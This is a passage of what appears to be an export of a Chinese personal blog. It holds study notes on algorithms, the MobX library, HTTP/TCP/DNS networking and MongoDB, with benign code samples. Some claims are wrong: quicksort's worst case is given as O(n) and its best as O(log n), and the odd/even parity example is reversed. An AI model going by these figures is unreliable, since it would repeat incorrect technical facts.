conquer（D\u0026amp;C）：找出基数条件，分解问题（缩小问题的规模），一直到符合基数条件\n注意：D\u0026amp;C定义要求每次递归调用，都必须缩小问题的规模，（缩小问题的规模可以依赖于欧几里得算法（求最大公约数的算法））\n当基数条件为数组为空或者只有一个元素时，直接返回数组（因为不需要排序），因此快速排序的元素个数必须大于等于2\n快速排序的工作原理就是从数组中选择一个元素，这个元素叫基准值（pivot），然后找到比基准值小的元素和比基准值大的元素，这时候有一个比基准值小的数值组成的子数组和一个比基准值大的数值组成的子数组，和一个基准值，这个被叫为分区（partitioning），如果子数组是有序的，直接左边子数组加基准值加右边子数组就完成排序了，如果不是有序的，那么将那俩个子数组进行快速排序，再合并（当子数组只有一个元素，那么就不需要进行排序了）\n快速排序的时间复杂度取决于基准值，快速排序平均情况下，时间复杂度为O(n log n)，一般情况下大O表示法会忽略常量（算法所需要的固定量），因为在数量很大的计算中，常量根本没有影响，但是当时间复杂度相同的时候，就可以看常量了，常量越小，算法的时间复杂度越小，最糟糕的情况下快速排序的时间复杂度为为O(n)，而最佳情况下为O(log n)\n散列表（散列映射，字典，关联数组）\n散列函数：当输入一个数据，将返回一个数据，而且返回的数据是一致的（输入数据一样的情况下，得到的数据必须要一样，输入不同数据的时候，得到的数据也必须不一致），散列函数必须知道数组有多大（只返回有效数据），散列函数精确指出某个数据的存储位置，不需要查找，平均情况下时间复杂度为O(1)\n散列表由键和值组成，当输出键或者值的时候，可以获得对应的值或者键，散列表可以用于避免出现重复数值，缓存（记住数据，避免重新计算数据或者重新处理数据）\n注意：如果散列表存储的链表很长，那么散列表的速度将会变慢，而且还可能存在冲突（多个数据占用一个位置，如果要解决冲突，只能在这个位置上再建立一个链表，来存储多个数据）\n填装因子：计算数组被占用的位置数，算法为散列表包含的元素数除以位置总数，得到的值为该散列表的填装因子，当填装因子大于1的时候，就表示该数组位置数不足，必须要添加位置（调整长度（resizing）），填装因子越小，出现冲突的可能就越小，散列表的性能就越高\n广度优先搜索（breadth-first search，BFS）\n广度优先搜索可以解决最短路径问题（shortest-path problem），用于图的查找算法\n图由一个个节点和边组成，一个节点可能和多个节点之间直接相连，那么这些节点又被叫为邻居，图被用于模拟不同的东西是如何相连的\n广度优先搜索可以解决图的两个问题，在某节点上，有前往某个节点的路径吗?和在某节点上，怎么前往某个节点最快，广度优先搜索的原理就是先搜索和起点直接连接的节点（一度关系），再查找二度关系（和二度关系有直接连接的节点），从起点开始向外延伸，如果目标在一度关系上，那么前往该目标的节点存在，而且可以直接前往，如果目标在二度关系上，那么找到二度关系于一度关系相连的路径上，这必须按照添加的顺序才能查找出来\n队列（queue）：一种先进先出的数据结构（First In First Out，FIFO），栈则是后进先出的数据结构（Last In First Out，LIFO）\n深度优先算法\n狄克斯特拉算法\n贪婪算法\n动态规划\nK最近相邻算法\n堆/栈/队列/优先级队列\n链表/反向链表/Hash/二叉树/红黑树\n大O标识法和时间复杂度\n","permalink":"https://99999.fun/posts/79/","summary":"虽然学过java和Python，但是还是JavaScript比较熟练，因此算法学习全部用JavaScript来写\n算法不会被程序语言所限制，也不会一个实现只有一个算法\n常见数据结构（数组，列表，映射，堆栈，队列，哈希表，树，图）\n算法(排序,双指针,查找,分治,动态规划,递归,回溯,贪心,位运算,DFS,BFS)\n大O表示法是专门用来表示算法速度有多快的，不同算法所耗时间的时间增速度不同\n一个算法执行的时间和解决问题的规模大小相关\n假设一个列表有n个元素，遍历全部元素，要执行n次，大O表示法为O(n)\n大O表示法不是表示消耗的时间，而是通过操作元素的次数决定的，一个优秀的算法操作元素次数肯定很少\n时间复杂度：\nO(1): Constant Complexity: Constant 常数复杂度 O(log n): Logarithmic Complexity: 对数复杂度 O(n): Linear Complexity: 线性时间复杂度 O(n^2): N square Complexity 平⽅方 O(n^3): N square Complexity ⽴立⽅方 O(2^n): Exponential Growth 指数 O(n!): Factorial 阶乘\n算法的特点：有穷性（必须要在一定的时间内完成，不能无限循环），确定性（每一条指令都有明确的目的，不产生二义性），可行性（可以通过基础运算来实现），输入输出（要有0个或者多个输入，要有1个或者多个输出）\n删除有序数组中的重复项\n保证有序数组中的元素是不重复的，也就是说不存在重复的元素\n有序数组中重复的肯定是挨着的，只需要遍历数组全部的元素，前面和后面进行比较，如果相同则删除后面的\n例如：\nlet arr = function(nums) {\rif(nums == null || nums.length == 0){\rreturn 0\r}\rlet b = 0\rfor(let a=0;a\u0026lt;nums.length;a++){\rif(nums[b]!=nums[a]){\rnums[++b] = nums[a]\r}\r}\rreturn ++b\r}\rb作为覆盖，a作为查询，当b的值不等于a查询到的值时，b++的值等于a的值，等于的时候b不改变，当不相等再等于到b上","title":"算法学习笔记"},{"content":"Mobx是一个状态管理库（状态管理实质上就是在管理数据变化）\nMobx通过透明的函数响应式编程使得状态管理变得简单和可扩展\nMobx状态管理是基于观察者模式的（Mobx6.0移除了修饰器）\n安装Mobx\nnpm install mobx mobx-react --save\r或者\nyarn add mobx mobx-react --save\r导入\nimport {observable, autorun, computed, action, makeObservable,reaction,when} from \u0026quot;mobx\u0026quot;\rimport {observer} from \u0026quot;mobx-react\u0026quot;\r注意：在严格模式中，是不允许在action之外改变状态的\n启动严格模式\nimport {configure} from 'mobx'\rconfigure({enforceActions: true})\robservable定义可观察的状态 action修改状态（动作） computed计算值\n数据变化可被观察，例如：\nlet appdata = observable([1,2,3,4,5])\rconsole.log(appdata[1])\rappdata = observable({a:1,b:2,c:3})\rconsole.log(appdata.a)\rappdata.a += 1\rconsole.log(appdata.a)\rappdata = observable.box(100)\rconsole.log(appdata)\r响应式对象\nmakeObservable（手动配置observable，action，computed）\nconst store = makeObservable({ count: 666, get double(){\rreturn this.count * 2\r},\rincrement(){\rthis.count += 1\r},\rdecrement(){\rthis.count -= 1\r},\r},{\rcount: observable, // 响应的属性\rdouble: computed, // 计算属性\rincrement: action, // 修改状态\rdecrement: action, // 修改状态\r})\rmakeAutoObservable（自动配置observable，action，computed，全部自有属性都为observable，全部getters为computed，全部computed都为action）\nconst store = makeAutoObservable({ count: 666,\rget double(){\rreturn this.count*2\r},\rincrement(){\rthis.count+=1\r},\rdecrement(){\rthis.count-=1\r}\r})\r计算属性（observable.box）\nlet datas = observable.box(1000)\rlet dataa = observable.box(666)\rlet abc = computed(function(){\rreturn dataa + datas\r})\rconsole.log(abc.get())\r操作状态（添加观察者，当状态发生变化，就会触发）\nautorun(() =\u0026gt; {\rappdata.datas = appdata.datas + 1\rconsole.log(appdata.datas)\r})\r监听数据变化（当store的状态发生改变，autorun方法就会被调用）\nlet xyz = observable({\rtitle: \u0026quot;hello world\u0026quot;\r})\rautorun(() =\u0026gt; {\rconsole.log(xyz.title)\r})\rxyz.title = \u0026quot;hallo mobx\u0026quot;\r当被观察数据被修改时，autorun()就会被触发\nreaction监听\nreaction(() =\u0026gt; store.count,\r(a, b) =\u0026gt; {\r// 当store.count修改就会被调用\r// 第一个值是当前值，第二个值为修改后的值\rconsole.log(a - b)\r}\r)\rwhen监听\nwhen(() =\u0026gt; store.count \u0026gt; 666, () =\u0026gt; {\rconsole.log(store.count)\r})\r(async function() {\r// when还会返回一个promise\rawait when(() =\u0026gt; store.count \u0026gt; 666)\rconsole.log('store.count \u0026gt; 666')\r})()\rMobx和Redux的比较：Redux通过限制数据的修改，Store中的数据是不可修改，只能通过action来修改，减少冗余。而Mobx就是通过自动更新来确保数据一致\nmobx鼓励使用多个store仓库，而Redux鼓励一个应用使用一个Redux仓库\n","permalink":"https://99999.fun/posts/78/","summary":"Mobx是一个状态管理库（状态管理实质上就是在管理数据变化）\nMobx通过透明的函数响应式编程使得状态管理变得简单和可扩展\nMobx状态管理是基于观察者模式的（Mobx6.0移除了修饰器）\n安装Mobx\nnpm install mobx mobx-react --save\r或者\nyarn add mobx mobx-react --save\r导入\nimport {observable, autorun, computed, action, makeObservable,reaction,when} from \u0026quot;mobx\u0026quot;\rimport {observer} from \u0026quot;mobx-react\u0026quot;\r注意：在严格模式中，是不允许在action之外改变状态的\n启动严格模式\nimport {configure} from 'mobx'\rconfigure({enforceActions: true})\robservable定义可观察的状态 action修改状态（动作） computed计算值\n数据变化可被观察，例如：\nlet appdata = observable([1,2,3,4,5])\rconsole.log(appdata[1])\rappdata = observable({a:1,b:2,c:3})\rconsole.log(appdata.a)\rappdata.a += 1\rconsole.log(appdata.a)\rappdata = observable.box(100)\rconsole.log(appdata)\r响应式对象\nmakeObservable（手动配置observable，action，computed）\nconst store = makeObservable({ count: 666, get double(){\rreturn this.count * 2\r},\rincrement(){\rthis.","title":"Mobx学习笔记"},{"content":"HTTP（HyperText Transfer Protocol）中文叫超文本传输协议，从中文名就知道是传输html文件或者其他超文本文件的\nHTTP是基于TCP/IP协议来传输数据的\n访问http服务器可以直接通过ip或者域名（域名其实是解析到ip的，实际上还是访问ip），通过web服务器提供的端口来进行请求或者响应\n浏览器和web服务器之间通信的架构叫B/S结构（Browser Server），使用的协议是HTTP（https协议其实就是HTTP的基础上，添加了SSL\nhttp是一种协议，制定了客户端与服务端信息数据的传递的规则\n从传递文本，到传递图片，音频，视频\nHTTP/0.9：于1990年问世，只能用于简单文字的交换，只有GET命令 HTTP/1.0：被正式列为www传输的标准，纳入RFC1945，增加status code和header，支持多字符集，权限，缓存等功能 HTTP/1.1：在1.0的基础上加上了连接方式的规约，持久连接，pipeline，host头 HTTP/2.0：HTTP2.0更安全，性能更好，二进制传输（2之前是字符串传输）\nhttp协议规定了会话是由客户端发起，服务端响应的\n客户端常见请求方式有GET，POST\nOSI七层模型，http协议是最上层的应用层\n应用层，表示层，会话层，传输层，网络层，数据链路层，物理层\n数据发送是从应用层到物理层（数据封装）\n数据接收是从物理层到应用层（数据解包）\n应用层就是为终端提供服务的，例如http，ftp等等\n表示层为数据提供压缩，加密等等功能\n会话层就是通过会话标识来确定是于哪个应用在通讯\n传输层就是定义了数据传输的协议和端口\n网络层就是加工数据，为数据添加一些信息，这一层的数据叫做包\n数据链路层就是定义了在单个链路上如何传输数据，网络中每台设备都有一个唯一的网络标识（MAC地址），这一层的数据叫做帧\n物理层就是物理设备的标准\nTCP/IP五层模型：应用层，传输层，网络层，数据链路层和物理层\n路由寻址：ip，mac，dhcp服务器\n先通过ip实现跨网端通信（如果是本地则直接传输给目标机器，不是则传输给出口路由器，一直到目标路由），然后通过MAC找到目标机器，目标机器获取到数据再根据网络模型向上处理\nDNS\nDNS域名系统是一个记录IP和域名映射的，域名服务器是分布式的，全世界一共有13台根域名服务器，当域名服务器只要自己解析不了，就会交给根域名服务器处理\n解析过程：\n机器通过访问本地域名服务器（一般是本地运营商提供，默认解析服务器）查询\n本地域名服务器检查缓存，没有就是向根域名服务器的其中一台发起查询请求\n根域名服务器根据要查询的结构找到对应的顶级域名服务器（管理全部注册在上面的二级域名服务器）信息发送会本地域名服务器\n本地域名服务器向顶级域名服务器发起查询\n顶级域名服务器根据域名结构查找到对应的二级域名服务器\n反复迭代最终查找到域名和 IP 的对应关系\n如果直接设置个公共域名服务器（例如：114，8之类的）能大大提升解析速度\nDNS解析的记录类型\nA记录\n直接将域名解析为IP\nCNAME记录\n给域名起个cname别名，例如访问了xxx会转发到aaa的域名上\nNS记录\n域名解析服务器记录，一般用来指定不同子域名对应到不同的解析服务器\nMX 记录\n电子邮箱服务，将指向邮件服务器地址\nCDN加速过程：\n用户访问域名地址\n因为域名被cdn接管了，域名解析只能获取到CNAME\nCDN通过CNAME来将地址代理到cdn服务器上，而不是源站\n通过CNAME获取到最近的cdn服务器的Ip地址，然后访问到cdn缓存服务器\ncdn缓存服务器再根据策略来判断是否存在该资源缓存，是否要向源站请求数据，再将数据返回给用户\nHTTPS协议\n通过http通信，经过SSL/TLS来建立安全信道，加密数据，http默认端口为80，https为443\nhttps就是在http协议基础上加了ssl协议\n一般服务端需要通过ssl证书来证明自己身份，ssl证书不可逆向，不可伪造，一旦发现伪造或者ssl证书不正确，浏览器一般都会拦截提示\n某些需要极其安全的需要客户端也是要证明身份，例如银行网站\nSSL协议：保证数据发送到正确目标，数据加密防止数据中途被拦截获取，保证数据完整性，数据不被串改\nHTTP方法：定义了对资源的操作，例如GET，POST等等\n前端中的HTTP\n先进行DNS解析-建立TCP连接（3次握手）-发送HTTP请求获取相关内容-浏览器构建DOM树和CSS树，然后生成渲染树。这个一个渐进式过程，浏览器引擎会力求最快将内容呈现给用户-关闭TCP连接（4次握手）\nhttp常见状态码\n1xx 信息 2xx 成功 3xx 重定向 4xx 客户端错误 5xx 服务器错误\n域名dns解析，发起TCP的3次握手，建立TCP连接发起http请求，服务器响应http请求，发送资源，浏览器得到资源后进行解析渲染\nTCP的三次握手：\n握手的目的是进行信息的同步，tcp是一种可靠连接，客户端和服务端会经历建立连接的阶段，而这个建立TCP连接的过程就是所谓的握手（握手实质是发送TCP报文）\n第一次握手客户端向服务器发送一个SYN段为1（Seq为随机数）的TCP/IP数据包（客户端进入SYN_SENT状态，已发送同步数据）\n第二次握手服务器返回客户端SYN和ACK（SYN为1，ACK为上一次握手Seq的值+1，Seq又为另一个随机数）的TCP/IP数据包（服务端进入SYN_RECVD状态，表示同步数据已收到）\n第三次握手客户端返回一个ACK段为上一次握手的Seq的值+1，Seq的值为另一个随机数的TCP/IP数据包给服务器（客户端接收到ACK为1的确认报文，正式进入连接状态）\nACK和Seq实质上是确认服务器和客户端都可以正常响应的（响应没有丢失，并且传输的数据也正确），只有三次握手完成才能建立HTTP连接\nTCP四次挥手\nTCP四次挥手是指关闭TCP连接的过程（断开TCP连接）\n第一次：当客户端的某个数据传输完毕后需要断开连接，向TCP发送FIN=1（报文段），要求停止再发送数据，关闭TCP连接（客户端进入FIN_WAIT_1状态，终止等待）\n第二次：服务端收到报文段并且发送确认报文段（ACK=1），进入等待关闭的状态（服务端进入CLOSE_WAIT状态（关闭等待））\n第三次：当服务端的数据传输完毕后，服务端发送连接断开的报文段（FIN = 1,ACK=1），进入最后的等待状态（服务端进入LAST_ACK状态，最后的确定）\n第四次：当客户端收到服务端的断开的报文段（FIN = 1），并且发送确认的报文段（ACK = 1），进入等待状态（CLOSe状态）\n实质上完成四次挥手也是没有断开的，需要经过等待定时器2MSL，才会关闭，保证下一次新连接中不会出现以前连接遗留的报文段\n2MSL即两倍的MSL，TCP的TIME_WAIT状态也称为2MSL等待状态\nTIME_WAIT状态是为了避免网络问题，导致ACK报文无法被对方接收到，而利用这个时间来重发可能丢失的报文\nMSL(Maximum Segment Lifetime)报文最长存活时间，表示报文可以存活的最长时间，而2MSL足以让客户端的报文和服务端的报文都失效了，确保没有当前的连接的报文还存活\n注意：如果在等待时间内，接收到了FIN字段的报文将会导致2MSL重新计算，直到没有接收到FIN字段的报文，并且也过了2MSL后才会断开TCP连接\nHTTP 1.1可以在一次连接中处理多个请求，请求排队处理，而不像1.0那样每一次请求都要建立单独的TCP连接，每一次请求完毕后，自动释放\n设置请求优先级，在一次连接中处理多个请求，必定会出现请求堵塞，因此，给请求设置优先级，重要的请求先得到响应\n请求头压缩，基于https的加密协议传输\nHTTP 2.0性能提升，可以在一次连接中处理多个请求，而且还是并行进行的，不会出现堵塞问题\nconst errorMessage = [\r{ code: 400, msg: '请求错误' },\r{ code: 401, msg: '未授权，请登录' },\r{ code: 403, msg: '拒绝访问' },\r{ code: 404, msg: '请求地址出错' },\r{ code: 408, msg: '请求超时' },\r{ code: 500, msg: '服务器内部错误' },\r{ code: 501, msg: '服务未实现' },\r{ code: 502, msg: '网关错误' },\r{ code: 503, msg: '服务不可用' },\r{ code: 504, msg: '网关超时' },\r{ code: 505, msg: 'HTTP版本不受支持' }\r]\rhttp的特点：可以根据协议头的head的数据类型，来完成不同的数据类型的传输，而且能保持连接（http1.0是非长时间连接，这里的保持连接指的是HTTP1.1的KeepAlive），不区分连接者的身份（无法分辨该客户是否访问过）\nhttp请求报文：由请求行（HTTP协议版本，URL字段，方法字段），请求头（向服务端请求要什么类型的什么数据），空行（提示服务端，请求头已经发送，不会再有请求头），请求体（数据）组成\nhttp响应报文：由响应行（HTTP协议版本，状态码），响应头（响应数据是什么类型的），空行（提示客户端，响应已经发送，不会再有响应），响应体（数据）组成\nHTTP CODE：表示服务器对请求的处理结果，常见的状态码有404，200，301，502，401等等\nTCP心跳机制：客户端每隔一段时间发送心跳包给服务端，通知服务端自己还在线，可以保持长连接\nKeepAlive模式（持久连接/连接复用）：可以在发送响应后的一段时间内保持连接，并且允许在同一个连接中存在多次数据请求和响应，而非KeepAlive模式就是会在响应后立刻断开连接，再新建一个连接来请求和响应，只有HTTP1.1支持KeepAlive模式\n管线化：在持久连接下，会将请求一起打包发送（多请求），然后服务端也是打包响应（多响应），管线化必须在持久连接下完成，而且只有GET和HEAD请求支持管线化，POST有所限制，首次连接不会使用管线化机制（避免服务端不支持HTTP1.1）,而且管线化不会影响响应返回的顺序\nTCP和UDP区别：tcp在发送之前需要连接，udp在发送之前不需要连接，tcp协议保证发送的数据不丢失（并且按照顺序接收），而udp并不能保证数据可靠，数据不丢失，不重复。tcp是字节流，udp是报文流，UDP没有堵塞系统（在网络堵塞的情况，不会影响源的发送量），tcp连接是点对点，udp的连接是可以一对一，一对多，多对一，多对多的，TCP首部开销为20字节，udp为8字节，tcp为可靠信道，udp为不可靠信道\n(TCP可靠在会记录那些数据发送了，又有那些数据被接收了，那些数据没有被接收，数据包按序到达，不允许出现半点差错，tcp连接需要三次握手，四次挥手来建立连接和结束连接)\nudp确保传输可靠：传输层已经不可靠，只能在应用层添加可靠传输的机制，例如超时重新发送，添加序号（根据序号有序发送/请求），时间戳等等，或者UDT（UDP-based Data Transfer Protocol）\n(TCP在高速长距离网络上性能很差)\nudt基于udp协议，引入拥塞控制和数据可靠性控制机制。UDT是面向连接的双向的应用层协议。并且同时支持可靠的数据流传输和部分可靠的数据报传输，支持点对点(p2p)\ntcp第三次握手可以携带数据发送（客户端处在ESTABLISHED状态）\nhttp和https\nhttp是无状态协议（无状态指客户端和服务端之间无需建立持久连接，当客户端发送请求，服务端返回响应后将关闭连接，服务端不保留任何有关连接的信息）\nhttps是指基于http协议加上了ssl层，https默认端口为443\n对称加密技术：加密和解密使用同一密钥，意味着数据传输过程中需要将密钥也一同传输（这个过程很危险）\n非对称加密：加密使用公钥，解密使用私钥（也可反过来），反正加密和解密是分别使用不同的密钥，这个过程是服务端将公钥分发到网络上，客户端获取到该公钥，客户端的数据使用公钥进行加密（无法使用公钥来解密），服务端获取到加密的数据后，通过服务端的私钥进行解密，来获取正文\nURL（Uniform Resource Locator，统一资源定位符）\nURN（Uniform Resource Name，统一资源名）\n流量控制和拥塞控制\n流量控制指的是限制（控制）发送者的发送速度，避免发送数据过快，接收者来不及接收，流量控制通过滑动窗口协议（连续ARQ协议）实现，通过接收方返回的ACK包（包含接受窗口大小），利用接受窗口大小来限制（控制）发送方的数据发送\n拥塞控制\n拥塞控制目的是防止网络负载过大，TCP的4大拥塞控制算法的，慢开始算法，拥塞控制算法，快重传算法，快恢复算法\n慢开始算法：通过cwnd（congestion window）值来控制（如果cwnd为1，那么只能发送1个数据报文段）\n慢开始算法的思路就是一开始不发送大量的数据，先测一下网络的拥塞的大小，从小到大逐渐增长拥塞窗口，慢开始门限初始值为16，cwnd初始化为一个报文段（慢开始算法只在TCP连接建立时和网络超时才使用）\n拥塞控制算法：控制拥塞窗口缓慢增长，思路是每经过一次RTT往返后，拥塞窗口（cwnd）加1，线性缓慢增长，当cwnd=16（慢开始门限），改执行拥塞控制算法，线性增长（当cwnd\u0026gt;=ssthresh时，执行拥塞控制算法），ssthresh指的是慢开始门限\n例如：当网络出现拥塞时，将下降慢开始门限（ssthresh）到cwnd/2的值，cwnd设置为1，执行慢开始算法，当cwnd=ssthresh，执行拥塞控制算法\n快重传算法：需要接收方收到失序的报文段时立刻发出重复确认（接收连续收到3次同一个重复确认，执行快重传算法，立刻重新发送丢失的数据，不等待超时时间过期），例如某个报文段被超时期限内没有收到确认信息，则认定为网络拥塞了，这时cwnd设置为1，慢开始门限（ssthresh）下降（下降一半）\n快恢复算法：快恢复算法是搭配快重传算法使用的，必须发送方接收到3个重复确认，执行快重传算法后才执行快恢复算法，（但是考虑网络出现拥塞可能收不到重复确认，所以发送方会认为网络没有拥塞，设置swnd等于ssthresh/2，执行拥塞控制算法，让cwnd线性增长）\n题外扩展1：socket是计算机之间进行通信的一种约定或一种方式，翻译为中文叫套接字，socket起源于unix的进程通信机制，可通过socket来向网络发送请求或者回复网络请求，socket是应用层和TCP/IP协议族通信的抽象层\n题外扩展2：webSocket是在单个TCP连接上进行全双工通信(full-duplex)的协议，允许服务端主动向客户端发送数据，在webSocket中，客户端和服务端只需要完成一次握手就是可以建立持久性连接，并且进行双向数据传输\n当浏览器访问一个域名时，发送了什么事情？\n客户端（浏览器端）访问域名，该域名下的DNS解析服务器将解析出ip地址，并且通过该ip地址找到目标web服务端\n客户端通过tcp3次握手和服务端建立TCP连接，客户端根据需求，向web服务端发送http请求报文，向服务器请求所需要的资源文件，web服务端接收到http请求报文，根据要求返回HTTP响应报文\n如果请求资源是html文档，则将对应目录下的HTML文档，以响应内容的方式返回给客户端，而当请求资源是php文件或者jsp文件时，由于web服务器无法处理php脚本或者jsp脚本文件，需要委托给专门的php引擎或者jsp引擎，引擎动态解析成html，然后将其返回给web服务器，web服务端再发送给客户端\nhttp的长连接（复用tcp/http连接）\nConnection ID：用于区分http连接，不同的http连接，ID是不同的\n判断是否是http长连接，通过headers的Connection来判断，如果为keep-alive就是代表该请求是http的长连接完成的，如果是close表示是短连接\n因为浏览器限制一个域最大创建6个连接，如果一个域有7个连接需求，就需要等待前面的6个连接其中一个响应完成后再建立连接（连接阻塞）\nTCP的可靠性\n奇偶校验（在发送的每个字节后加上一位，让字节中为1的数可以是奇数或者偶数，通过奇偶校验来确定数据是否出错）\n这里使用的是00001010，a的二进制\n奇校验：在字节后补个0，例如：000010100，位为1的数量为偶数（2个）\n偶校验：在字节后补个1，例如：000010101，位为1的数量为奇数（3个）\n累加和校验（在数据包的最后加入之前全部数据的字节点累加和）\n例如：要传输8，10，2，5，12\n加上累加后实质的数据包为8，10，2，5，12，37\n而且这个37就是前面全部数据的累加校验和，数据接收方只需要对前面的数据进行累加计算，如果这个本地的累加计算和数据包最后一个字节不相同时，认定数据错误，否则数据正确\nCRC校验（CRC算法）\nDV（域名验证）证书，OV（组织验证）证书，EV（扩展验证）证书\nDV ssl证书颁发只验证申请人是否具备域名所有权，OV ssl证书颁发验证申请人的身份证明，确认对方的身份，EV ssl证书颁发最为严格，在验证申请人的身份证明，一般都是银行，金融，电子商务，大型企业，保险等需要最高级别加密才会使用（因为EV证书价格贵）\n","permalink":"https://99999.fun/posts/77/","summary":"HTTP（HyperText Transfer Protocol）中文叫超文本传输协议，从中文名就知道是传输html文件或者其他超文本文件的\nHTTP是基于TCP/IP协议来传输数据的\n访问http服务器可以直接通过ip或者域名（域名其实是解析到ip的，实际上还是访问ip），通过web服务器提供的端口来进行请求或者响应\n浏览器和web服务器之间通信的架构叫B/S结构（Browser Server），使用的协议是HTTP（https协议其实就是HTTP的基础上，添加了SSL\nhttp是一种协议，制定了客户端与服务端信息数据的传递的规则\n从传递文本，到传递图片，音频，视频\nHTTP/0.9：于1990年问世，只能用于简单文字的交换，只有GET命令 HTTP/1.0：被正式列为www传输的标准，纳入RFC1945，增加status code和header，支持多字符集，权限，缓存等功能 HTTP/1.1：在1.0的基础上加上了连接方式的规约，持久连接，pipeline，host头 HTTP/2.0：HTTP2.0更安全，性能更好，二进制传输（2之前是字符串传输）\nhttp协议规定了会话是由客户端发起，服务端响应的\n客户端常见请求方式有GET，POST\nOSI七层模型，http协议是最上层的应用层\n应用层，表示层，会话层，传输层，网络层，数据链路层，物理层\n数据发送是从应用层到物理层（数据封装）\n数据接收是从物理层到应用层（数据解包）\n应用层就是为终端提供服务的，例如http，ftp等等\n表示层为数据提供压缩，加密等等功能\n会话层就是通过会话标识来确定是于哪个应用在通讯\n传输层就是定义了数据传输的协议和端口\n网络层就是加工数据，为数据添加一些信息，这一层的数据叫做包\n数据链路层就是定义了在单个链路上如何传输数据，网络中每台设备都有一个唯一的网络标识（MAC地址），这一层的数据叫做帧\n物理层就是物理设备的标准\nTCP/IP五层模型：应用层，传输层，网络层，数据链路层和物理层\n路由寻址：ip，mac，dhcp服务器\n先通过ip实现跨网端通信（如果是本地则直接传输给目标机器，不是则传输给出口路由器，一直到目标路由），然后通过MAC找到目标机器，目标机器获取到数据再根据网络模型向上处理\nDNS\nDNS域名系统是一个记录IP和域名映射的，域名服务器是分布式的，全世界一共有13台根域名服务器，当域名服务器只要自己解析不了，就会交给根域名服务器处理\n解析过程：\n机器通过访问本地域名服务器（一般是本地运营商提供，默认解析服务器）查询\n本地域名服务器检查缓存，没有就是向根域名服务器的其中一台发起查询请求\n根域名服务器根据要查询的结构找到对应的顶级域名服务器（管理全部注册在上面的二级域名服务器）信息发送会本地域名服务器\n本地域名服务器向顶级域名服务器发起查询\n顶级域名服务器根据域名结构查找到对应的二级域名服务器\n反复迭代最终查找到域名和 IP 的对应关系\n如果直接设置个公共域名服务器（例如：114，8之类的）能大大提升解析速度\nDNS解析的记录类型\nA记录\n直接将域名解析为IP\nCNAME记录\n给域名起个cname别名，例如访问了xxx会转发到aaa的域名上\nNS记录\n域名解析服务器记录，一般用来指定不同子域名对应到不同的解析服务器\nMX 记录\n电子邮箱服务，将指向邮件服务器地址\nCDN加速过程：\n用户访问域名地址\n因为域名被cdn接管了，域名解析只能获取到CNAME\nCDN通过CNAME来将地址代理到cdn服务器上，而不是源站\n通过CNAME获取到最近的cdn服务器的Ip地址，然后访问到cdn缓存服务器\ncdn缓存服务器再根据策略来判断是否存在该资源缓存，是否要向源站请求数据，再将数据返回给用户\nHTTPS协议\n通过http通信，经过SSL/TLS来建立安全信道，加密数据，http默认端口为80，https为443\nhttps就是在http协议基础上加了ssl协议\n一般服务端需要通过ssl证书来证明自己身份，ssl证书不可逆向，不可伪造，一旦发现伪造或者ssl证书不正确，浏览器一般都会拦截提示\n某些需要极其安全的需要客户端也是要证明身份，例如银行网站\nSSL协议：保证数据发送到正确目标，数据加密防止数据中途被拦截获取，保证数据完整性，数据不被串改\nHTTP方法：定义了对资源的操作，例如GET，POST等等\n前端中的HTTP\n先进行DNS解析-建立TCP连接（3次握手）-发送HTTP请求获取相关内容-浏览器构建DOM树和CSS树，然后生成渲染树。这个一个渐进式过程，浏览器引擎会力求最快将内容呈现给用户-关闭TCP连接（4次握手）\nhttp常见状态码\n1xx 信息 2xx 成功 3xx 重定向 4xx 客户端错误 5xx 服务器错误","title":"简单认识HTTP协议"},{"content":"MongoDB是一个以键值对存储数据的数据库（基于json描述数据，实质上是一个叫BSON的数据格式，BSON是基于二进制字节流，json基于文本）\nMongoDB是No SQL家族的成员之一，No SQL一般指的是非关系型数据库（Not only SQL）\n关系型数据库和Excel表格类似，表与表之间存在着复杂的关联关系，例如MySQL，sql server\n而非关系型数据库不使用SQL作为查询，不需要遵循ACID（Atomicity Consistency Insolation Durability）\n基于json有个好处就是不需要额外对数据进行转换（例如sql，在调用其数据时需要进行数据的转换）\nMongoDB使用了WiredTiger存储引擎（3.2+版本开始为默认引擎），利用可用内存来缓存数据，来提供优秀的读取性能，该引擎使用WiredTiger内部缓存和文件系统缓存这俩种缓存\nWiredTiger提供了内存快照，而且每隔60秒（创建检查点）就将内存快照写入磁盘（数据持久化，而且持久化的数据还可以作为校验，确保数据在最后一个检查点是一致的，而且旧检查点可以作为有效检查点恢复因为写入新检查点时的错误而且重启导致丢失的数据）\n对于60秒内的数据丢失，WiredTiger采用了Journal机制（WAL预写日志）来提供断电保护，Journal每隔100ms刷新日志，数据被存储在Journal文件（发生断电情况，可通过Journal文件根据记录追加数据），Journal机制会保留检查点之间保留所有数据修改\n而且不用担心100ms以内的数据丢失，因为MongoDB提供了其特有的写入安全机制（Write Concern），默认使用Acknowledged安全策略，该策略在每次写入操作时确认状态，这个状态取决于内存的写入（不保证数据不丢失）\nJournaled策略要求每一次写入操作必须在journal落盘后（确保数据不丢失，吞吐和响应会有影响），该策略会确认落盘后等待30ms，将30ms内的全部写入操作统一按照顺序写入盘中\nmajority副本集策略要求只有当数据被复制到绝大多数节点（包括主节点）后才应答（适合集群）\nWrite Concern用法\n例如：\ndb.test.insert({\u0026ldquo;name\u0026rdquo;:\u0026ldquo;hallo\u0026rdquo;},{writeConcern:{w:1}})\nw有这几个常用值，分别为0（非应答式写入），1（应答式写入），\u0026gt;1（设置副本写入节点数量），majority(表示majority副本集策略)\n而且还提供了wtimeout参数来限制节点写入时间（超过该时间，报错，只适用集群环境，单位ms）\nj参数是用来开启写入操作必须在写入journal日志后响应（Journaled策略，参数值为布尔值）\nMongoDB有三种集群部署架构，主从，副本集，分片\n一个副本集架构由一个主节点和多个副本节点组成，个主节点和多个副本节点的数据同步基于oplog，当主节点发生故障，副本节点会自动选择一个新的主节点来继续工作\n在分片架构上，数据均衡分布在每一个节点上（负载均衡），可通过增加或者减少分片来实现按需扩展，\n简单使用MongoDB数据库\nmongod.conf文件是MongoDB数据库配置文件\n启动数据库（没有该数据库则创建数据库）\nmongod \u0026ndash;dbpath D:\\mongodb\n默认端口为27017\n启动服务\nnet start mongodb\n连接数据库\nmongo \u0026ndash;port 27017\n切换数据库（没有该数据库就会创建）\nuse demo\n查看全部数据库\nshow 